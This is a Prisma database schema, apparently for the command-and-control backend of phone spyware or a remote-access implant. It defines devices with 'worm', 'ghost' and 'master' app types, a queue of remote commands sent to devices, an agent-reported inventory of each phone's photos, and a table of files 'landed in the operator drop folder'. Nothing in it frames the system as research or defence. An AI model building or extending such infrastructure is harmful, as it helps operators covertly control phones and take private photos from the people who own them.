generator client {
  provider = "prisma-client-js"
}

datasource db {
  provider = "postgresql"
  url      = env("DATABASE_URL")
}

model User {
  id        String   @id @default(uuid())
  username  String   @unique
  passHash  String   @map("pass_hash")
  createdAt DateTime @default(now()) @map("created_at")
  devices   Device[]
  refreshTokens RefreshToken[]

  @@map("users")
}

model RefreshToken {
  id        String   @id @default(uuid())
  userId    String   @map("user_id")
  tokenHash String   @unique @map("token_hash")
  expiresAt DateTime @map("expires_at")
  revoked   Boolean  @default(false)
  createdAt DateTime @default(now()) @map("created_at")
  user      User     @relation(fields: [userId], references: [id], onDelete: Cascade)

  @@index([userId])
  @@map("refresh_tokens")
}

enum AppType {
  worm
  ghost
  master
}

model Device {
  id             String    @id @default(uuid())
  ownerId        String    @map("owner_id")
  name           String
  phone          String
  platform       String
  variant        String    @default("standard")
  appType        AppType   @default(worm) @map("app_type")
  enrollTokenHash String   @map("enroll_token_hash")
  deviceTokenHash String   @map("device_token_hash")
  status         String    @default("offline")
  gender         String    @default("")
  stats          Json?
  formattedAt    DateTime? @map("formatted_at")
  lastSeen       DateTime  @default(now()) @map("last_seen")
  createdAt      DateTime  @default(now()) @map("created_at")
  updatedAt      DateTime  @updatedAt @map("updated_at")
  owner          User      @relation(fields: [ownerId], references: [id], onDelete: Cascade)
  commands       Command[]
  photos         DevicePhoto[]
  downloads      DownloadedFile[]

  @@index([ownerId])
  @@index([enrollTokenHash])
  @@index([deviceTokenHash])
  @@map("devices")
}

model Command {
  id        String    @id @default(uuid())
  deviceId  String    @map("device_id")
  type      String
  payload   Json      @default("{}")
  state     String    @default("queued")
  result    String?
  expiresAt DateTime? @map("expires_at")
  createdAt DateTime  @default(now()) @map("created_at")
  updatedAt DateTime  @updatedAt @map("updated_at")
  device    Device    @relation(fields: [deviceId], references: [id], onDelete: Cascade)

  @@index([deviceId])
  @@map("commands")
}

/// Agent-reported media inventory; hash is the dedup key, never the MediaStore id.
model DevicePhoto {
  id        String    @id @default(uuid())
  deviceId  String    @map("device_id")
  hash      String
  name      String
  category  String    @default("original")
  size      Int       @default(0)
  pulledAt  DateTime? @map("pulled_at")
  createdAt DateTime  @default(now()) @map("created_at")
  device    Device    @relation(fields: [deviceId], references: [id], onDelete: Cascade)

  @@unique([deviceId, hash])
  @@index([deviceId, category])
  @@map("device_photos")
}

/// One row per artifact landed in the operator drop folder.
model DownloadedFile {
  id        String   @id @default(uuid())
  deviceId  String   @map("device_id")
  kind      String   @default("photo")
  category  String   @default("")
  path      String
  sha256    String   @default("")
  bytes     Int      @default(0)
  createdAt DateTime @default(now()) @map("created_at")
  device    Device   @relation(fields: [deviceId], references: [id], onDelete: Cascade)

  @@index([deviceId])
  @@index([sha256])
  @@map("downloaded_files")
}
